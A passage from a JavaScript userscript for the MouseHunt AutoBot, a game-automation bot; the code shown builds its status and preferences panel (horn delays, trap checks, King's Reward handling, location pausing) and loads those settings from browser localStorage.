		if (fbPlatform || hiFivePlatform || mhPlatform)
		{
			headerElement = document.getElementById('noscript');
		}
		else if (mhMobilePlatform)
		{
			headerElement = document.getElementById('mobileHorn');
		}
		
		if (headerElement)
		{
			var timerDivElement = document.createElement('div');
			
			var hr1Element = document.createElement('hr');
			timerDivElement.appendChild(hr1Element);
			hr1Element = null;
			
			// show bot title and version
			var titleElement = document.createElement('div');
			titleElement.setAttribute('id', 'titleElement');
			if (targetPage && aggressiveMode)
			{
				titleElement.innerHTML = "<a href=\"http://ooiks.com/blog/category/mousehunt-autobot\" target=\"_blank\"><b>MouseHunt AutoBot (version " + scriptVersion + ")</b></a> - <font color='red'>Aggressive Mode</font>";
			}
			else
			{
				titleElement.innerHTML = "<a href=\"http://ooiks.com/blog/category/mousehunt-autobot\" target=\"_blank\"><b>MouseHunt AutoBot (version " + scriptVersion + ")</b></a>";
			}
			timerDivElement.appendChild(titleElement);
			titleElement = null;
			
			if (targetPage)
			{
				nextHornTimeElement = document.createElement('div');
				nextHornTimeElement.setAttribute('id', 'nextHornTimeElement');
				nextHornTimeElement.innerHTML = "<b>Next Hunter Horn Time:</b> Loading...";
				timerDivElement.appendChild(nextHornTimeElement);
				
				checkTimeElement = document.createElement('div');
				checkTimeElement.setAttribute('id', 'checkTimeElement');
				checkTimeElement.innerHTML = "<b>Next Trap Check Time:</b> Loading...";
				timerDivElement.appendChild(checkTimeElement);
				
				if (pauseAtInvalidLocation)
				{
					// location information only display when enable this feature
					travelElement = document.createElement('div');
					travelElement.setAttribute('id', 'travelElement');
					travelElement.innerHTML = "<b>Target Hunt Location:</b> Loading...";
					timerDivElement.appendChild(travelElement);
				}
				
				var lastKingRewardDate = getStorage("lastKingRewardDate");
				var lastDateStr;
				if (lastKingRewardDate == undefined || lastKingRewardDate == null)
				{
					lastDateStr = "-";
				}
				else
				{
					var lastDate = new Date(lastKingRewardDate);
					lastDateStr = lastDate.toDateString() + " " + lastDate.toTimeString().substring(0, 8);
					lastDate = null;
				}
				
				kingTimeElement = document.createElement('div');
				kingTimeElement.setAttribute('id', 'kingTimeElement');
				kingTimeElement.innerHTML = "<b>Last King's Reward:</b> " + lastDateStr + " ";
				timerDivElement.appendChild(kingTimeElement);
				
				lastKingRewardSumTimeElement = document.createElement('font');
				lastKingRewardSumTimeElement.setAttribute('id', 'lastKingRewardSumTimeElement');
				lastKingRewardSumTimeElement.innerHTML = "(Loading...)";
				kingTimeElement.appendChild(lastKingRewardSumTimeElement);
				
				lastKingRewardDate = null;
				lastDateStr = null;
				
				if (showLastPageLoadTime)
				{
					var nowDate = new Date();
				
					// last page load time
					var loadTimeElement = document.createElement('div');
					loadTimeElement.setAttribute('id', 'loadTimeElement');
					loadTimeElement.innerHTML = "<b>Last Page Load: </b>" + nowDate.toDateString() + " " + nowDate.toTimeString().substring(0, 8);
					timerDivElement.appendChild(loadTimeElement);
					
					loadTimeElement = null;
					nowDate = null;
				}
			}
			else
			{
				// player currently navigating other page instead of hunter camp
				var helpTextElement = document.createElement('div');
				helpTextElement.setAttribute('id', 'helpTextElement');
				if (fbPlatform)
				{
					if (secureConnection)
					{
						helpTextElement.innerHTML = "<b>Note:</b> MouseHunt AutoBot will only run at <a href='https://www.mousehuntgame.com/canvas/'>Hunter Camp</a>. This is to prevent the bot from interfering user's activity.";
					}
					else
					{
						helpTextElement.innerHTML = "<b>Note:</b> MouseHunt AutoBot will only run at <a href='http://www.mousehuntgame.com/canvas/'>Hunter Camp</a>. This is to prevent the bot from interfering user's activity.";
					}
				}
				else if (hiFivePlatform)
				{
					if (secureConnection)
					{
						helpTextElement.innerHTML = "<b>Note:</b> MouseHunt AutoBot will only run at <a href='https://mousehunt.hi5.hitgrab.com/'>Hunter Camp</a>. This is to prevent the bot from interfering user's activity.";
					}
					else
					{
						helpTextElement.innerHTML = "<b>Note:</b> MouseHunt AutoBot will only run at <a href='http://mousehunt.hi5.hitgrab.com/'>Hunter Camp</a>. This is to prevent the bot from interfering user's activity.";
					}
				}
				else if (mhPlatform)
				{
					if (secureConnection)
					{
						helpTextElement.innerHTML = "<b>Note:</b> MouseHunt AutoBot will only run at <a href='https://mousehuntgame.com/'>Hunter Camp</a>. This is to prevent the bot from interfering user's activity.";
					}
					else
					{
						helpTextElement.innerHTML = "<b>Note:</b> MouseHunt AutoBot will only run at <a href='http://mousehuntgame.com/'>Hunter Camp</a>. This is to prevent the bot from interfering user's activity.";
					}
				}
				else if (mhMobilePlatform)
				{
					if (secureConnection)
					{
						helpTextElement.innerHTML = "<b>Note:</b> Mobile version of Mousehunt is not supported currently. Please use the <a href='https://www.mousehuntgame.com/?switch_to=standard'>standard version of MouseHunt</a>.";
					}
					else
					{
						helpTextElement.innerHTML = "<b>Note:</b> Mobile version of Mousehunt is not supported currently. Please use the <a href='http://www.mousehuntgame.com/?switch_to=standard'>standard version of MouseHunt</a>.";
					}
				}
				timerDivElement.appendChild(helpTextElement);
				
				helpTextElement = null;
			}
			
			var showPreference = getStorage('showPreference');
			if (showPreference == undefined || showPreference == null)
			{
				showPreference = false;
				setStorage("showPreference", showPreference);
			}
			
			var showPreferenceLinkDiv = document.createElement('div');
			showPreferenceLinkDiv.setAttribute('id', 'showPreferenceLinkDiv');
			showPreferenceLinkDiv.setAttribute('style', 'text-align:right');
			timerDivElement.appendChild(showPreferenceLinkDiv);
			
			var showPreferenceSpan = document.createElement('span');
			var showPreferenceLinkStr = '<a id="showPreferenceLink" name="showPreferenceLink" onclick="if (document.getElementById(\'showPreferenceLink\').innerHTML == \'<b>[Hide Preference]</b>\') { document.getElementById(\'preferenceDiv\').style.display=\'none\';  document.getElementById(\'showPreferenceLink\').innerHTML=\'<b>[Show Preference]</b>\'; } else { document.getElementById(\'preferenceDiv\').style.display=\'block\'; document.getElementById(\'showPreferenceLink\').innerHTML=\'<b>[Hide Preference]</b>\'; }">';
			if (showPreference == true)
				showPreferenceLinkStr += '<b>[Hide Preference]</b>';
			else
				showPreferenceLinkStr += '<b>[Show Preference]</b>';
			showPreferenceLinkStr += '</a>';
			showPreferenceLinkStr += '&nbsp;&nbsp;&nbsp;';
			showPreferenceSpan.innerHTML = showPreferenceLinkStr;
			showPreferenceLinkDiv.appendChild(showPreferenceSpan);
			showPreferenceLinkStr = null;
			showPreferenceSpan = null;
			showPreferenceLinkDiv = null;
			
			var hr2Element = document.createElement('hr');
			timerDivElement.appendChild(hr2Element);
			hr2Element = null;
			
			var preferenceHTMLStr = '<table border="0" width="100%">';
			if (aggressiveMode)
			{
				preferenceHTMLStr += '<tr>';
				preferenceHTMLStr += '<td style="height:24px; text-align:right;">';
				preferenceHTMLStr += '<a title="Bot aggressively by ignore all safety measure such as check horn image visible before sounding it">';
				preferenceHTMLStr += '<b>Aggressive Mode</b>';
				preferenceHTMLStr += '</a>';
				preferenceHTMLStr += '&nbsp;&nbsp;:&nbsp;&nbsp;';
				preferenceHTMLStr += '</td>';
				preferenceHTMLStr += '<td style="height:24px">';
				preferenceHTMLStr += '<input type="radio" id="AggressiveModeInputTrue" name="AggressiveModeInput" value="true" onchange="if (document.getElementById(\'AggressiveModeInputTrue\').checked == true) { document.getElementById(\'HornTimeDelayMinInput\').disabled=\'disabled\'; document.getElementById(\'HornTimeDelayMaxInput\').disabled=\'disabled\';}" checked="checked"/> True';
				preferenceHTMLStr += '   ';
				preferenceHTMLStr += '<input type="radio" id="AggressiveModeInputFalse" name="AggressiveModeInput" value="false" onchange="if (document.getElementById(\'AggressiveModeInputFalse\').checked == true) { document.getElementById(\'HornTimeDelayMinInput\').disabled=\'\'; document.getElementById(\'HornTimeDelayMaxInput\').disabled=\'\';}"/> False';
				preferenceHTMLStr += '</td>';
				preferenceHTMLStr += '</tr>';
				preferenceHTMLStr += '<tr>';
				preferenceHTMLStr += '<td style="height:24px; text-align:right;">';
				preferenceHTMLStr += '<a title="Extra delay time before sounding the horn (in seconds)">';
				preferenceHTMLStr += '<b>Horn Time Delay</b>';
				preferenceHTMLStr += '</a>';
				preferenceHTMLStr += '&nbsp;&nbsp;:&nbsp;&nbsp;';
				preferenceHTMLStr += '</td>';
				preferenceHTMLStr += '<td style="height:24px">';
				preferenceHTMLStr += '<input type="text" id="HornTimeDelayMinInput" name="HornTimeDelayMinInput" disabled="disabled" value="' + hornTimeDelayMin.toString() + '"/> seconds';
				preferenceHTMLStr += ' ~ ';
				preferenceHTMLStr += '<input type="text" id="HornTimeDelayMaxInput" name="HornTimeDelayMaxInput" disabled="disabled" value="' + hornTimeDelayMax.toString() + '"/> seconds';
				preferenceHTMLStr += '</td>';
				preferenceHTMLStr += '</tr>';
			}
			else
			{
				preferenceHTMLStr += '<tr>';
				preferenceHTMLStr += '<td style="height:24px; text-align:right;">';
				preferenceHTMLStr += '<a title="Bot aggressively by ignore all safety measure such as check horn image visible before sounding it">';
				preferenceHTMLStr += '<b>Aggressive Mode</b>';
				preferenceHTMLStr += '</a>';
				preferenceHTMLStr += '&nbsp;&nbsp;:&nbsp;&nbsp;';
				preferenceHTMLStr += '</td>';
				preferenceHTMLStr += '<td style="height:24px">';
				preferenceHTMLStr += '<input type="radio" id="AggressiveModeInputTrue" name="AggressiveModeInput" value="true" onchange="if (document.getElementById(\'AggressiveModeInputTrue\').checked == true) { document.getElementById(\'HornTimeDelayMinInput\').disabled=\'disabled\'; document.getElementById(\'HornTimeDelayMaxInput\').disabled=\'disabled\';}"/> True';
				preferenceHTMLStr += '   ';
				preferenceHTMLStr += '<input type="radio" id="AggressiveModeInputFalse" name="AggressiveModeInput" value="false" onchange="if (document.getElementById(\'AggressiveModeInputFalse\').checked == true) { document.getElementById(\'HornTimeDelayMinInput\').disabled=\'\'; document.getElementById(\'HornTimeDelayMaxInput\').disabled=\'\';}" checked="checked"/> False';
				preferenceHTMLStr += '</td>';
				preferenceHTMLStr += '</tr>';
				preferenceHTMLStr += '<tr>';
				preferenceHTMLStr += '<td style="height:24px; text-align:right;">';
				preferenceHTMLStr += '<a title="Extra delay time before sounding the horn (in seconds)">';
				preferenceHTMLStr += '<b>Horn Time Delay</b>';
				preferenceHTMLStr += '</a>&nbsp;&nbsp;:&nbsp;&nbsp;';
				preferenceHTMLStr += '</td>';
				preferenceHTMLStr += '<td style="height:24px">';
				preferenceHTMLStr += '<input type="text" id="HornTimeDelayMinInput" name="HornTimeDelayMinInput" value="' + hornTimeDelayMin.toString() + '"/> seconds';
				preferenceHTMLStr += ' ~ ';
				preferenceHTMLStr += '<input type="text" id="HornTimeDelayMaxInput" name="HornTimeDelayMaxInput" value="' + hornTimeDelayMax.toString() + '"/> seconds';
				preferenceHTMLStr += '</td>';
				preferenceHTMLStr += '</tr>';
			}
			if (enableTrapCheck)
			{
				preferenceHTMLStr += '<tr>';
				preferenceHTMLStr += '<td style="height:24px; text-align:right;">';
				preferenceHTMLStr += '<a title="Enable trap check once an hour"><b>Trap Check</b></a>';
				preferenceHTMLStr += '&nbsp;&nbsp;:&nbsp;&nbsp;';
				preferenceHTMLStr += '</td>';
				preferenceHTMLStr += '<td style="height:24px">';
				preferenceHTMLStr += '<input type="radio" id="TrapCheckInputTrue" name="TrapCheckInput" value="true" onchange="if (document.getElementById(\'TrapCheckInputTrue\').checked == true) { document.getElementById(\'TrapCheckTimeOffsetInput\').disabled=\'\'; document.getElementById(\'TrapCheckTimeDelayMinInput\').disabled=\'\'; document.getElementById(\'TrapCheckTimeDelayMaxInput\').disabled=\'\';}" checked="checked"/> True';
				preferenceHTMLStr += '   ';
				preferenceHTMLStr += '<input type="radio" id="TrapCheckInputFalse" name="TrapCheckInput" value="false" onchange="if (document.getElementById(\'TrapCheckInputFalse\').checked == true) { document.getElementById(\'TrapCheckTimeOffsetInput\').disabled=\'disabled\'; document.getElementById(\'TrapCheckTimeDelayMinInput\').disabled=\'disabled\'; document.getElementById(\'TrapCheckTimeDelayMaxInput\').disabled=\'disabled\';}"/> False';
				preferenceHTMLStr += '</td>';
				preferenceHTMLStr += '</tr>';
				preferenceHTMLStr += '<tr>';
				preferenceHTMLStr += '<td style="height:24px; text-align:right;">';
				preferenceHTMLStr += '<a title="Trap check time different value (00 minutes - 45 minutes)"><b>Trap Check Time Offset</b></a>';
				preferenceHTMLStr += '&nbsp;&nbsp;:&nbsp;&nbsp;';
				preferenceHTMLStr += '</td>';
				preferenceHTMLStr += '<td style="height:24px">';
				preferenceHTMLStr += '<input type="text" id="TrapCheckTimeOffsetInput" name="TrapCheckTimeOffsetInput" value="' + trapCheckTimeDiff.toString() + '"/> seconds';
				preferenceHTMLStr += '</td>';
				preferenceHTMLStr += '</tr>';
				preferenceHTMLStr += '<tr>';
				preferenceHTMLStr += '<td style="height:24px; text-align:right;">';
				preferenceHTMLStr += '<a title="Extra delay time to trap check (in seconds)"><b>Trap Check Time Delay</b></a>';
				preferenceHTMLStr += '&nbsp;&nbsp;:&nbsp;&nbsp;';
				preferenceHTMLStr += '</td>';
				preferenceHTMLStr += '<td style="height:24px">';
				preferenceHTMLStr += '<input type="text" id="TrapCheckTimeDelayMinInput" name="TrapCheckTimeDelayMinInput" value="' + checkTimeDelayMin.toString() + '"/> seconds';
				preferenceHTMLStr += ' ~ ';
				preferenceHTMLStr += '<input type="text" id="TrapCheckTimeDelayMaxInput" name="TrapCheckTimeDelayMaxInput" value="' + checkTimeDelayMax.toString() + '"/> seconds';
				preferenceHTMLStr += '</td>';
				preferenceHTMLStr += '</tr>';
			}
			else
			{
				preferenceHTMLStr += '<tr>';
				preferenceHTMLStr += '<td style="height:24px; text-align:right;">';
				preferenceHTMLStr += '<a title="Enable trap check once an hour"><b>Trap Check</b></a>';
				preferenceHTMLStr += '&nbsp;&nbsp;:&nbsp;&nbsp;';
				preferenceHTMLStr += '</td>';
				preferenceHTMLStr += '<td style="height:24px">';
				preferenceHTMLStr += '<input type="radio" id="TrapCheckInputTrue" name="TrapCheckInput" value="true" onchange="if (document.getElementById(\'TrapCheckInputTrue\').checked == true) { document.getElementById(\'TrapCheckTimeOffsetInput\').disabled=\'\'; document.getElementById(\'TrapCheckTimeDelayMinInput\').disabled=\'\'; document.getElementById(\'TrapCheckTimeDelayMaxInput\').disabled=\'\';}"/> True';
				preferenceHTMLStr += '   ';
				preferenceHTMLStr += '<input type="radio" id="TrapCheckInputFalse" name="TrapCheckInput" value="false" onchange="if (document.getElementById(\'TrapCheckInputFalse\').checked == true) { document.getElementById(\'TrapCheckTimeOffsetInput\').disabled=\'disabled\'; document.getElementById(\'TrapCheckTimeDelayMinInput\').disabled=\'disabled\'; document.getElementById(\'TrapCheckTimeDelayMaxInput\').disabled=\'disabled\';}" checked="checked"/> False';
				preferenceHTMLStr += '</td>';
				preferenceHTMLStr += '</tr>';
				preferenceHTMLStr += '<tr>';
				preferenceHTMLStr += '<td style="height:24px; text-align:right;">';
				preferenceHTMLStr += '<a title="Trap check time different value (00 minutes - 45 minutes)"><b>Trap Check Time Offset</b></a>';
				preferenceHTMLStr += '&nbsp;&nbsp;:&nbsp;&nbsp;';
				preferenceHTMLStr += '</td>';
				preferenceHTMLStr += '<td style="height:24px">';
				preferenceHTMLStr += '<input type="text" id="TrapCheckTimeOffsetInput" name="TrapCheckTimeOffsetInput" disabled="disabled" value="' + trapCheckTimeDiff.toString() + '"/> seconds';
				preferenceHTMLStr += '</td>';
				preferenceHTMLStr += '</tr>';
				preferenceHTMLStr += '<tr>';
				preferenceHTMLStr += '<td style="height:24px; text-align:right;">';
				preferenceHTMLStr += '<a title="Extra delay time to trap check (in seconds)"><b>Trap Check Time Delay</b></a>';
				preferenceHTMLStr += '&nbsp;&nbsp;:&nbsp;&nbsp;';
				preferenceHTMLStr += '</td>';
				preferenceHTMLStr += '<td style="height:24px">';
				preferenceHTMLStr += '<input type="text" id="TrapCheckTimeDelayMinInput" name="TrapCheckTimeDelayMinInput" disabled="disabled" value="' + checkTimeDelayMin.toString() + '"/> seconds';
				preferenceHTMLStr += ' ~ ';
				preferenceHTMLStr += '<input type="text" id="TrapCheckTimeDelayMaxInput" name="TrapCheckTimeDelayMaxInput" disabled="disabled" value="' + checkTimeDelayMax.toString() + '"/> seconds';
				preferenceHTMLStr += '</td>';
				preferenceHTMLStr += '</tr>';
			}
			if (isKingWarningSound)
			{
				preferenceHTMLStr += '<tr>';
				preferenceHTMLStr += '<td style="height:24px; text-align:right;">';
				preferenceHTMLStr += '<a title="Play sound when encounter king\'s reward"><b>Play King Reward Sound</b></a>';
				preferenceHTMLStr += '&nbsp;&nbsp;:&nbsp;&nbsp;';
				preferenceHTMLStr += '</td>';
				preferenceHTMLStr += '<td style="height:24px">';
				preferenceHTMLStr += '<input type="radio" id="PlayKingRewardSoundInputTrue" name="PlayKingRewardSoundInput" value="true" checked="checked"/> True';
				preferenceHTMLStr += '   ';
				preferenceHTMLStr += '<input type="radio" id="PlayKingRewardSoundInputFalse" name="PlayKingRewardSoundInput" value="false" /> False';
				preferenceHTMLStr += '</td>';
				preferenceHTMLStr += '</tr>';
			}
			else
			{
				preferenceHTMLStr += '<tr>';
				preferenceHTMLStr += '<td style="height:24px; text-align:right;">';
				preferenceHTMLStr += '<a title="Play sound when encounter king\'s reward"><b>Play King Reward Sound</b></a>';
				preferenceHTMLStr += '&nbsp;&nbsp;:&nbsp;&nbsp;';
				preferenceHTMLStr += '</td>';
				preferenceHTMLStr += '<td style="height:24px">';
				preferenceHTMLStr += '<input type="radio" id="PlayKingRewardSoundInputTrue" name="PlayKingRewardSoundInput" value="true" /> True';
				preferenceHTMLStr += '   ';
				preferenceHTMLStr += '<input type="radio" id="PlayKingRewardSoundInputFalse" name="PlayKingRewardSoundInput" value="false" checked="checked"/> False';
				preferenceHTMLStr += '</td>';
				preferenceHTMLStr += '</tr>';
			}
			if (reloadKingReward)
			{
				preferenceHTMLStr += '<tr>';
				preferenceHTMLStr += '<td style="height:24px; text-align:right;">';
				preferenceHTMLStr += '<a title="Reload the the page according to King Reward Resume Time when encount King Reward"><b>King Reward Resume</b></a>';
				preferenceHTMLStr += '&nbsp;&nbsp;:&nbsp;&nbsp;';
				preferenceHTMLStr += '</td>';
				preferenceHTMLStr += '<td style="height:24px">';
				preferenceHTMLStr += '<input type="radio" id="KingRewardResumeInputTrue" name="KingRewardResumeInput" value="true" onchange="if (document.getElementById(\'KingRewardResumeInputTrue\').checked == true) { document.getElementById(\'KingRewardResumeTimeInput\').disabled=\'\'; }" checked="checked"/> True';
				preferenceHTMLStr += '   ';
				preferenceHTMLStr += '<input type="radio" id="KingRewardResumeInputFalse" name="KingRewardResumeInput" value="false" onchange="if (document.getElementById(\'KingRewardResumeInputFalse\').checked == true) { document.getElementById(\'KingRewardResumeTimeInput\').disabled=\'disabled\'; }"/> False';
				preferenceHTMLStr += '</td>';
				preferenceHTMLStr += '</tr>';
				preferenceHTMLStr += '<tr>';
				preferenceHTMLStr += '<td style="height:24px; text-align:right;">';
				preferenceHTMLStr += '<a title="Duration of pausing the script before reload the King\'s Reward page (in seconds)"><b>King Reward Resume Time</b></a>';
				preferenceHTMLStr += '&nbsp;&nbsp;:&nbsp;&nbsp;';
				preferenceHTMLStr += '</td>';
				preferenceHTMLStr += '<td style="height:24px">';
				preferenceHTMLStr += '<input type="text" id="KingRewardResumeTimeInput" name="KingRewardResumeTimeInput" value="' + kingPauseTimeMax.toString() + '"/> seconds';
				preferenceHTMLStr += '</td>';
				preferenceHTMLStr += '</tr>';
			}
			else
			{
				preferenceHTMLStr += '<tr>';
				preferenceHTMLStr += '<td style="height:24px; text-align:right;">';
				preferenceHTMLStr += '<a title="Reload the the page according to King Reward Resume Time when encounter King Reward"><b>King Reward Resume</b></a>';
				preferenceHTMLStr += '&nbsp;&nbsp;:&nbsp;&nbsp;';
				preferenceHTMLStr += '</td>';
				preferenceHTMLStr += '<td style="height:24px">';
				preferenceHTMLStr += '<input type="radio" id="KingRewardResumeInputTrue" name="KingRewardResumeInput" value="true" onchange="if (document.getElementById(\'KingRewardResumeInputTrue\').checked == true) { document.getElementById(\'KingRewardResumeTimeInput\').disabled=\'\'; }"/> True';
				preferenceHTMLStr += '   ';
				preferenceHTMLStr += '<input type="radio" id="KingRewardResumeInputFalse" name="KingRewardResumeInput" value="false" onchange="if (document.getElementById(\'KingRewardResumeInputFalse\').checked == true) { document.getElementById(\'KingRewardResumeTimeInput\').disabled=\'disabled\'; }" checked="checked"/> False';
				preferenceHTMLStr += '</td>';
				preferenceHTMLStr += '</tr>';
				preferenceHTMLStr += '<tr>';
				preferenceHTMLStr += '<td style="height:24px; text-align:right;">';
				preferenceHTMLStr += '<a title="Duration of pausing the script before reload the King\'s Reward page (in seconds)"><b>King Reward Resume Time</b></a>';
				preferenceHTMLStr += '&nbsp;&nbsp;:&nbsp;&nbsp;';
				preferenceHTMLStr += '</td>';
				preferenceHTMLStr += '<td style="height:24px">';
				preferenceHTMLStr += '<input type="text" id="KingRewardResumeTimeInput" name="KingRewardResumeTimeInput" disabled="disabled" value="' + kingPauseTimeMax.toString() + '"/> seconds';
				preferenceHTMLStr += '</td>';
				preferenceHTMLStr += '</tr>';
			}
			if (pauseAtInvalidLocation)
			{
				preferenceHTMLStr += '<tr>';
				preferenceHTMLStr += '<td style="height:24px; text-align:right;">';
				preferenceHTMLStr += '<a title="The script will pause if player at different location that hunt location set before"><b>Remember Location</b></a>';
				preferenceHTMLStr += '&nbsp;&nbsp;:&nbsp;&nbsp;';
				preferenceHTMLStr += '</td>';
				preferenceHTMLStr += '<td style="height:24px">';
				preferenceHTMLStr += '<input type="radio" id="PauseLocationInputTrue" name="PauseLocationInput" value="true" checked="checked"/> True';
				preferenceHTMLStr += '   ';
				preferenceHTMLStr += '<input type="radio" id="PauseLocationInputFalse" name="PauseLocationInput" value="false" /> False';
				preferenceHTMLStr += '</td>';
				preferenceHTMLStr += '</tr>';
			}
			else
			{
				preferenceHTMLStr += '<tr>';
				preferenceHTMLStr += '<td style="height:24px; text-align:right;">';
				preferenceHTMLStr += '<a title="The script will pause if player at different location that hunt location set before"><b>Remember Location</b></a>';
				preferenceHTMLStr += '&nbsp;&nbsp;:&nbsp;&nbsp;';
				preferenceHTMLStr += '</td>';
				preferenceHTMLStr += '<td style="height:24px">';
				preferenceHTMLStr += '<input type="radio" id="PauseLocationInputTrue" name="PauseLocationInput" value="true"/> True';
				preferenceHTMLStr += '   ';
				preferenceHTMLStr += '<input type="radio" id="PauseLocationInputFalse" name="PauseLocationInput" value="false" checked="checked"/> False';
				preferenceHTMLStr += '</td>';
				preferenceHTMLStr += '</tr>';
			}
			
			preferenceHTMLStr += '<tr>';
			preferenceHTMLStr += '<td style="height:24px; text-align:right;" colspan="2">';
			preferenceHTMLStr += '(Changes only take place after user save the preference) ';
			preferenceHTMLStr += '<input type="button" id="PreferenceSaveInput" value="Save" onclick="	\
				if (document.getElementById(\'AggressiveModeInputTrue\').checked == true) { window.localStorage.setItem(\'AggressiveMode\', \'true\'); } else { window.localStorage.setItem(\'AggressiveMode\', \'false\'); }	\
				window.localStorage.setItem(\'HornTimeDelayMin\', document.getElementById(\'HornTimeDelayMinInput\').value); window.localStorage.setItem(\'HornTimeDelayMax\', document.getElementById(\'HornTimeDelayMaxInput\').value);	\
				if (document.getElementById(\'TrapCheckInputTrue\').checked == true) { window.localStorage.setItem(\'TrapCheck\', \'true\'); } else { window.localStorage.setItem(\'TrapCheck\', \'false\'); }	\
				window.localStorage.setItem(\'TrapCheckTimeOffset\', document.getElementById(\'TrapCheckTimeOffsetInput\').value);	\
				window.localStorage.setItem(\'TrapCheckTimeDelayMin\', document.getElementById(\'TrapCheckTimeDelayMinInput\').value); window.localStorage.setItem(\'TrapCheckTimeDelayMax\', document.getElementById(\'TrapCheckTimeDelayMaxInput\').value);	\
				if (document.getElementById(\'PlayKingRewardSoundInputTrue\').checked == true) { window.localStorage.setItem(\'PlayKingRewardSound\', \'true\'); } else { window.localStorage.setItem(\'PlayKingRewardSound\', \'false\'); }	\
				if (document.getElementById(\'KingRewardResumeInputTrue\').checked == true) { window.localStorage.setItem(\'KingRewardResume\', \'true\'); } else { window.localStorage.setItem(\'KingRewardResume\', \'false\'); }	\
				window.localStorage.setItem(\'KingRewardResumeTime\', document.getElementById(\'KingRewardResumeTimeInput\').value);	\
				if (document.getElementById(\'PauseLocationInputTrue\').checked == true) { window.localStorage.setItem(\'PauseLocation\', \'true\'); } else { window.localStorage.setItem(\'PauseLocation\', \'false\'); }	\
				';
			if (fbPlatform)
			{
				if (secureConnection)
					preferenceHTMLStr += 'window.location.href=\'https://www.mousehuntgame.com/canvas/\';"/>';
				else
					preferenceHTMLStr += 'window.location.href=\'http://www.mousehuntgame.com/canvas/\';"/>';
			}
			else if (hiFivePlatform)
			{
				if (secureConnection)
					preferenceHTMLStr += 'window.location.href=\'https://mousehunt.hi5.hitgrab.com/\';"/>';
				else
					preferenceHTMLStr += 'window.location.href=\'http://mousehunt.hi5.hitgrab.com/\';"/>';
			}
			else if (mhPlatform)
			{
				if (secureConnection)
					preferenceHTMLStr += 'window.location.href=\'https://mousehuntgame.com/\';"/>';
				else
					preferenceHTMLStr += 'window.location.href=\'http://mousehuntgame.com/\';"/>';
			}
			preferenceHTMLStr += '&nbsp;&nbsp;&nbsp;</td>';
			preferenceHTMLStr += '</tr>';
			preferenceHTMLStr += '</table>';

			var preferenceDiv = document.createElement('div');
			preferenceDiv.setAttribute('id', 'preferenceDiv');
			if (showPreference == true)
				preferenceDiv.setAttribute('style', 'display: block');
			else
				preferenceDiv.setAttribute('style', 'display: none');
			preferenceDiv.innerHTML = preferenceHTMLStr;
			timerDivElement.appendChild(preferenceDiv);
			preferenceHTMLStr = null;
			showPreference = null;

			var hr3Element = document.createElement('hr');
			preferenceDiv.appendChild(hr3Element);
			hr3Element = null;
			preferenceDiv = null;
			
			// embed all msg to the page
			headerElement.parentNode.insertBefore(timerDivElement, headerElement);
			
			timerDivElement = null;
		}
		headerElement = null;
	}
	
	targetPage = null;
}

function loadPreferenceSettingFromStorage()
{
	var aggressiveModeTemp = getStorage("AggressiveMode");
	if (aggressiveModeTemp == undefined || aggressiveModeTemp == null)
	{
		setStorage("AggressiveMode", aggressiveMode.toString());
	}
	else if (aggressiveModeTemp == true || aggressiveModeTemp.toLowerCase() == "true")
	{
		aggressiveMode = true;
	}
	else
	{
		aggressiveMode = false;
	}
	aggressiveModeTemp = undefined;
	
	var hornTimeDelayMinTemp = getStorage("HornTimeDelayMin");
	var hornTimeDelayMaxTemp = getStorage("HornTimeDelayMax");
	if (hornTimeDelayMinTemp == undefined || hornTimeDelayMinTemp == null || hornTimeDelayMaxTemp == undefined || hornTimeDelayMaxTemp == null)
	{
		setStorage("HornTimeDelayMin", hornTimeDelayMin);
		setStorage("HornTimeDelayMax", hornTimeDelayMax);
	}
	else
	{
		hornTimeDelayMin = parseInt(hornTimeDelayMinTemp);
		hornTimeDelayMax = parseInt(hornTimeDelayMaxTemp);
	}
	hornTimeDelayMinTemp = undefined;
	hornTimeDelayMaxTemp = undefined;
	
	var trapCheckTemp = getStorage("TrapCheck");
	if (trapCheckTemp == undefined || trapCheckTemp == null)
	{
		setStorage("TrapCheck", enableTrapCheck.toString());
	}
	else if (trapCheckTemp == true || trapCheckTemp.toLowerCase() == "true")
	{
		enableTrapCheck = true;
	}
	else
	{
		enableTrapCheck = false;
	}
	trapCheckTemp = undefined;
	
	var trapCheckTimeOffsetTemp = getStorage("TrapCheckTimeOffset");
	if (trapCheckTimeOffsetTemp == undefined || trapCheckTimeOffsetTemp == null)
	{
		setStorage("TrapCheckTimeOffset", trapCheckTimeDiff);
	}
	else
	{
		trapCheckTimeDiff = parseInt(trapCheckTimeOffsetTemp);
	}
	trapCheckTimeOffsetTemp = undefined;
	
	var trapCheckTimeDelayMinTemp = getStorage("TrapCheckTimeDelayMin");
	var trapCheckTimeDelayMaxTemp = getStorage("TrapCheckTimeDelayMax");
	if (trapCheckTimeDelayMinTemp == undefined || trapCheckTimeDelayMinTemp == null || trapCheckTimeDelayMaxTemp == undefined || trapCheckTimeDelayMaxTemp == null)
	{
		setStorage("TrapCheckTimeDelayMin", checkTimeDelayMin);
		setStorage("TrapCheckTimeDelayMax", checkTimeDelayMax);
	}
	else
	{
		checkTimeDelayMin = parseInt(trapCheckTimeDelayMinTemp);
		checkTimeDelayMax = parseInt(trapCheckTimeDelayMaxTemp);
	}
	trapCheckTimeDelayMinTemp = undefined;
	trapCheckTimeDelayMaxTemp = undefined;
	
	var playKingRewardSoundTemp = getStorage("PlayKingRewardSound");
	if (playKingRewardSoundTemp == undefined || playKingRewardSoundTemp == null)
	{
		setStorage("PlayKingRewardSound", isKingWarningSound.toString());
	}
	else if (playKingRewardSoundTemp == true || playKingRewardSoundTemp.toLowerCase() == "true")
	{
		isKingWarningSound = true;
	}
	else
	{
		isKingWarningSound = false;
	}
	playKingRewardSoundTemp = undefined;
	
	var kingRewardResumeTemp = getStorage("KingRewardResume");
	if (kingRewardResumeTemp == undefined || kingRewardResumeTemp == null)
	{
		setStorage("KingRewardResume", reloadKingReward.toString());
	}
	else if (kingRewardResumeTemp == true || kingRewardResumeTemp.toLowerCase() == "true")
	{
		reloadKingReward = true;
	}
	else
	{
		reloadKingReward = false;
	}
	kingRewardResumeTemp = undefined;
	
	var kingRewardResumeTimeTemp = getStorage("KingRewardResumeTime");
	if (kingRewardResumeTimeTemp == undefined || kingRewardResumeTimeTemp == null)
	{
		setStorage("KingRewardResumeTime", kingPauseTimeMax);
	}
	else
	{
		kingPauseTimeMax = parseInt(kingRewardResumeTimeTemp);
	}
	kingRewardResumeTimeTemp = undefined;
	
	var pauseLocationTemp = getStorage("PauseLocation");
	if (pauseLocationTemp == undefined || pauseLocationTemp == null)
	{
